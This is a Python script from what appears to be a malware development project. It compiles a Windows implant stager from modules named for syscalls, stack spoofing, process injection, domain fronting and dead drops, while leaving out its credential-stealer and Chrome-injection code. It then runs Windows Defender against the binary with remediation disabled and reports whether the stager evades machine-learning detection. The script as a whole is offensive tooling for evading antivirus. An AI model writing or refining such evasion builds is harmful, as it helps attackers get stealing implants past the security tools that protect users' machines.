#!/usr/bin/env python3
"""Test stager-only build (no stealer code) against Defender."""
import subprocess, os

os.makedirs('build', exist_ok=True)

# Stager-only: NO stealer.c, NO chrome_v20.c, NO chrome_inject.c
srcs = [
    'agent/native/stager.c', 'agent/native/core.c', 'agent/native/syscall.c',
    'agent/native/stack_spoof.c', 'agent/native/cap_loader.c',
    'agent/native/dead_drop.c', 'agent/native/inject.c',
    'agent/native/domain_front.c', 'agent/native/bof_loader.c',
]
libs = '-lkernel32 -luser32 -lws2_32 -lgdi32 -luuid -ladvapi32 -lcrypt32 -lole32 -loleaut32 -lwinhttp -lbcrypt -liphlpapi -ldbghelp -lshlwapi -lntdll'

src_str = ' '.join(srcs)
cmd = f'gcc -w -DARES_RELEASE -O2 -s -fno-ident -fno-asynchronous-unwind-tables -Wl,--stack,4194304 -mwindows -I. -o build/stager_test.exe {src_str} {libs}'

print('[*] Building stager-only (no stealer code)...')
r = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd='.')
if r.returncode != 0:
    print(f'FAIL: {r.stderr[-2000:]}')
else:
    sz = os.path.getsize('build/stager_test.exe')
    print(f'[+] Built: stager_test.exe ({sz:,} bytes)')
    
    # Defender scan
    plat = r'C:\ProgramData\Microsoft\Windows Defender\Platform'
    vs = sorted(os.listdir(plat), reverse=True)
    mp = os.path.join(plat, vs[0], 'MpCmdRun.exe')
    exe_path = os.path.abspath('build/stager_test.exe')
    r2 = subprocess.run([mp, '-Scan', '-ScanType', '3', '-File', exe_path, '-DisableRemediation'],
                        capture_output=True, text=True, timeout=30)
    if 'found no threats' in r2.stdout:
        print('[+] DEFENDER: CLEAN! Stager-only bypasses ML detection!')
    else:
        for line in r2.stdout.split('\n'):
            if 'Threat' in line and ':' in line:
                print(f'[-] DEFENDER: {line.strip()}')
        print(r2.stdout[:800])
